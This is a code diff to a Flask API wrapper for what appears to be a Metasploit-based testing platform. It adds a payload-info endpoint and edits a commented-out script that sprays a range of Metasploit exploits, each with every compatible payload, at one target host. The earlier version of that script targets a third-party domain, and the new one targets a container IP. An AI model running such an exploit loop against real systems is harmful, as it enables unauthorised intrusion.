@@ -206,25 +206,40 @@ class FlaskAppWrapper(object):
             resource_class_kwargs=metasploit_controller_kwargs,
         )
 
+        self._api.add_resource(
+            MetasploitController,
+            '/DockerServerInstances/<instance_id>/Metasploit/<payload_name>/PayloadInfo',
+            endpoint='/DockerServerInstances/<instance_id>/Metasploit/<payload_name>/PayloadInfo',
+            methods=[HttpMethods.GET],
+            resource_class_kwargs=metasploit_controller_kwargs,
+        )
 
-# from metasploit.connections import Metasploit
 
-# source_host = '18.218.217.142'
+# from metasploit.api.connections import Metasploit
+#
+#
+# def results(client, uuid):
+#     return client.call('module.results', [uuid])
+#
+# source_host = '3.18.101.73'
 # m = Metasploit(server=source_host, port=50000)
-# target_host = 'google.co.il'
+# target_host = '172.17.0.3'
 # result = []
-# for e in m.exploits[300:500]:
+# for e in m.exploits[360:500]:
 #     try:
-#         print(f"sessions {m.metasploit_client.sessions.list}")
 #         exploit = m.metasploit_client.modules.use('exploit', mname=e)
 #         if 'RHOSTS' in exploit.options:
 #             exploit['RHOSTS'] = target_host
 #             for p in exploit.targetpayloads():
-#                 result.append(exploit.execute(payload=p))
+#                 res = exploit.execute(payload=p)
+#                 if res['job_id'] and res['job_id'] in m.metasploit_client.jobs.list:
+#                     print(results(client=m.metasploit_client, uuid=res['uuid']))
+#                 print(m.metasploit_client.jobs.list)
+#                 print(res)
 #
 #     except Exception as e:
 #         print(e)
-#
+
 # print(m.exploits)
 
 
